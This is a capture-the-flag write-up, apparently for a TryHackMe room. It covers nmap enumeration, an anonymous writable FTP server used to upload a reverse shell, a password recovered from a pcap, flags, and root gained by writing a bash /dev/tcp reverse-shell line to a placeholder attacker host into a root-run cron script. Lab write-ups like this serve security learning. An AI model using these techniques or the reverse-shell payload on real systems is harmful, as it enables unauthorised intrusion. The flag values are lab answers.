
# Enum

nmap scan

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.65.176
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
MAC Address: 02:64:75:25:A9:C1 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

looks like there are ftp ssh http, and it gave us information about the ftp because it allows anonymous login


![](https://i.imgur.com/rxNZr3D.png)



![](https://i.imgur.com/1mDObrg.png)



![](https://i.imgur.com/qNezfpd.png)



Maya is a keyword.



![](https://i.imgur.com/DqaZqSZ.png)


so i think we can just upload a reverse shell on the ftp server and get access then shall we?

![](https://i.imgur.com/lIGjZow.png)


successfully got shell :D

![](https://i.imgur.com/gy96zoA.png)


now we need to explore..

we found the recipe!!

![](https://i.imgur.com/H46eA3L.png)


```
love
```

so then we can explroe and i found something called incidents, it has a pcap file inside so we need to take it and put it in the ftp server so we can retrieve it on our main machine

![](https://i.imgur.com/JAUa8vi.png)


after ananlyzing the wireshark file we found that the attempted password was c4ntg3t3n0ughsp1c3 but its incorrect. so we gotta explore around

![](https://i.imgur.com/jxOgzHb.png)


looks like the pcap file shows that the user tried to access root with that password, what if we use the password for lennie and it worked!!!

![](https://i.imgur.com/9Q6sYX1.png)


we used the command so we dont have the error of `su: must be run from a terminal`

`/usr/bin/script -qc /bin/bash /dev/null`

[su must be run from a terminal](https://forum.hackthebox.com/t/su-must-be-run-from-a-terminal/1458/4)

after that we can get the user.txt in lennie's dir

the flag is `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

![](https://i.imgur.com/G4BAkvo.png)



now we need to privesc

so after examining i found that there are other dirs in lennie's dir. which shows scripts, documents

i found that there are .sh and .txt files inside documents but theres something weird.. the sh runs every minute?? so i cat and found that it echos to variable LIST and it redirects the output of the echo to file startup_list.txt, then after that it executes the print.sh so that means it executes print.sh every minute then right? 
after checking where the print.sh file is at its in /etc/print.sh and luckily lennie is the owner of this file so that means i can easily echo inside this file a shell because it gets executed every minute by root.

i echoed the shell to print.sh 

```
`bash -i >& /dev/tcp/your_attack_machine_ip/your_attack_machine_port 0>&1`
```

then listened on my main machine on the port and successfully got root access :D 

successfully cat the root.txt and gg

![](https://i.imgur.com/y01ybg5.png)


